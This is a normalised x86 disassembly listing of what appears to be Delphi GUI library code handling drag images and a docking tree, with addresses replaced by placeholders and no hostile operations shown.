je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_449f1c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_449c84
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_449f90
push ebx
push esi
mov esi eax
mov eax esi
call sub_44ed6c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_449ef8
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_449df0
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_449fd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444294
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_440940
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a034
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_44a084
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_422134
xor eax eax
push ebp
push sub_44a122
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_422568
xor eax eax
push ebp
push sub_44a0ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_440958
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a106
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_422568
retn
sub_44a134
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44a1c8
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_44a150
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44a1c8
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_44a7c0
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_44a1c8
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_44a1fc
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44a28c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov edx 0x2
call sub_44a28c
jmp r-xdata
retn
sub_44a244
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44a2f8
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov edx 0x2
call sub_44a2f8
jmp r-xdata
retn
sub_44a28c
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_44a6c0
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_44a2f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_44a1ac
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_44a6c0
push eax
mov eax esi
call sub_44a1fc
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_44a6c0
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_44a3a8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44a1ac
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_44a7c0
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_44a2f8
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_44a1ac
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_44a2f8
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_44a1fc
mov edx eax
add edx esi
mov eax ebx
call sub_44a6e8
mov edx edi
mov eax ebx
call sub_44a6e8
jmp r-xdata
mov eax ebx
call sub_44a548
mov eax ebx
call sub_44a798
mov ebx eax
test ebx ebx
jne r-xdata
sub_44a450
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_40442c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404480
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_44a494
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_4038bc
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_44a505
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_442a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_44a518
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_44a798
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_44a548
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44a2f8
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44a2f8
mov esi eax
push ebp
call sub_44a518
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a798
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44a28c
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44a28c
mov ecx ebx
pop edx
call sub_414b8c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_441724
mov eax [ ebp - 0x4 ]
call sub_44a6c0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_44a6c0
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a6c0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_44a6c0
push ebx
mov ebx eax
mov eax ebx
call sub_44a1c8
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_44a150
test al al
je r-xdata
mov eax ebx
call sub_44a1fc
pop ebx
retn
sub_44a6fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a6e8
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44a198
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_44a6ec
mov edx esi
call sub_44a6fc
sub_44a738
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44a6c0
mov edi eax
mov eax ebx
call sub_44a1fc
cmp edi eax
jl r-xdata
mov eax esi
call sub_44a3a8
mov eax [ esi + 0x1c ]
push eax
push sub_44c248
mov edx esi
call sub_44aa74
mov eax ebx
call sub_44a6c0
mov edi eax
mov eax esi
call sub_44a244
cmp edi eax
jle r-xdata
mov eax ebx
call sub_44a738
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_44a7a4
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44a1c8
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_44a7cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403690
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403a24
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a174
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421b38
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42896c
mov edx eax
mov eax ebx
call sub_421cb4
mov eax [ ebp - 0x4 ]
call sub_44a99c
xor eax eax
push ebp
push sub_44a8d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_445284
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44a3a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a8df
mov eax [ ebp - 0x4 ]
call sub_44a9a0
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_445248
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44a8df
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44c774
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a934
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44b9a0
mov eax [ esi + 0x10 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_44a9b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_44a9b4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_44a9b4
pop ecx
sub_44aa0c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_44a9b4
pop ecx
sub_44aa38
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44aa38
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44aa38
pop ecx
sub_44aa8c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_44aa0c
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44a2f8
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_44a2f8
push eax
mov edx 0x1
mov eax ebx
call sub_44a28c
push eax
mov edx 0x2
mov eax ebx
call sub_44a28c
pop edx
pop ecx
call sub_414b8c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402fc4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44ab10
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_44a548
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_414b8c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441724
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a174
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44aa0c
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_44a198
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44ba38
mov edx esi
mov eax ebx
call sub_44aa0c
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_441d08
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a174
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_441cf4
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_44a2f8
mov edx eax
mov eax edi
call sub_44a6e8
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_44a2f8
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_44a2f8
mov edx eax
mov eax edi
call sub_44a6e8
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_44a2f8
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44ad20
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44aec8
jmp r-xdata
sub_44ad20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a174
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_44a6c0
mov edx eax
mov eax ebx
call sub_44a6e8
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_44a6e8
mov eax [ esi + 0x64 ]
call sub_44a6c0
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44bd90
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44aa74
mov eax [ esi + 0x64 ]
call sub_44a6c0
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44bd90
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44aa74
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44c114
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44aa74
mov eax [ esi + 0x64 ]
call sub_44a6c0
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44c248
xor edx edx
mov eax esi
call sub_44aa74
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_44a6e8
adc edx 0x0
mov eax ebx
call sub_44a3a8
mov eax ebx
call sub_44a738
push esi
push sub_44c248
xor edx edx
mov eax esi
call sub_44aa74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_44aec8
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
